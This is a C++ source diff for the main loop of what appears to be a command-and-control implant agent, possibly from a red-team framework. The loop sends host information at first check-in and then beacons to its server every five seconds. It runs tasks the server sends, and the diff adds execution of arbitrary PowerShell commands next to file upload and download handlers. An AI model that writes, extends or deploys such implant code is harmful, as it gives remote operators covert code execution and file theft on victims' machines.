@@ -42,44 +42,77 @@ Agent::Agent(CommManager commManager, TaskQueueManager taskManager)
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+
 void Agent::Start()
 {
+    // Perform the initial check-in and send host information to the communication manager.
     commManager.IntialCheckin(GetHostInformation().StructToJson());
 
+    // Continuously check for new tasks and process pending tasks.
     while (true)
     {
-        if (!taskManager.HasPendingResult())
-        {
-            taskManager.QueueTask(commManager.Checkin());
-        }
-        else
-        {
-            std::string newTask = commManager.Checkin(taskManager.GetTaskResult());
-            taskManager.QueueTask(newTask);
-        }
+        // Check in with the server, including any available task results,
+        // and queue any new task returned by the server.
+        std::string newTask = commManager.Checkin(taskManager.GetTaskResults());
+        taskManager.QueueTask(newTask);
 
+        // Only process a task if one is waiting in the task queue.
         if (taskManager.HasPendingTask())
         {
+            // Retrieve the next task from the queue.
             auto request = taskManager.GetNextTask();
 
-            Response result = std::visit(overloaded{[](const TaskRequest<bool> &) -> Response
-                                                    {
-                                                        return CreateTaskResponse(0, NO_CODE, NO_CODE, TASK_ERROR,
-                                                                                  TaskError{1, "Unsupported task."});
-                                                    },
-                                                    [this](const TaskRequest<CommandUploadFile> &request) -> Response
-                                                    {
-                                                        return UploadFile(request.taskID, request.data);
-                                                    },
-                                                    [this](const TaskRequest<CommandDownloadFile> &request) -> Response
-                                                    {
-                                                        return DownloadFile(request.taskID, request.data);
-                                                    }},
-                                         request);
+            // Dispatch the task based on its request type.
+            // Each handler returns a Response containing the task result.
+            Response result = std::visit(
+                overloaded{
+                    // Handle PowerShell command requests.
+                    [this](const TaskRequest<CommandPowershell> &psRequest) -> Response
+                    {
+                        return this->ExecutePowerShell(
+                            psRequest.taskID,
+                            psRequest.data);
+                    },
 
+                    // Handle file upload requests.
+                    [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
+                    {
+                        return this->UploadFile(
+                            uploadRequest.taskID,
+                            uploadRequest.data);
+                    },
+
+                    // Handle file download requests.
+                    [this](const TaskRequest<CommandDownloadFile> &downloadRequest) -> Response
+                    {
+                        return this->DownloadFile(
+                            downloadRequest.taskID,
+                            downloadRequest.data);
+                    },
+
+                    // Return an error response for explicitly unsupported Boolean tasks.
+                    [](const TaskRequest<bool> &) -> Response
+                    {
+                        return CreateTaskResponse(
+                            0,
+                            NO_CODE,
+                            NO_CODE,
+                            TASK_ERROR,
+                            TaskError{1, "Unsupported task."});
+                    },
+
+                    // Provide a default response for any other unhandled request type.
+                    [](const auto &) -> Response
+                    {
+                        return TaskResponse<TaskSuccess>{};
+                    }},
+                request);
+
+            // Store the response so it can be included in a subsequent check-in.
             taskManager.StoreTaskResult(result);
         }
 
+        // Pause for five seconds before checking in again.
         Sleep(5000);
     }
 }
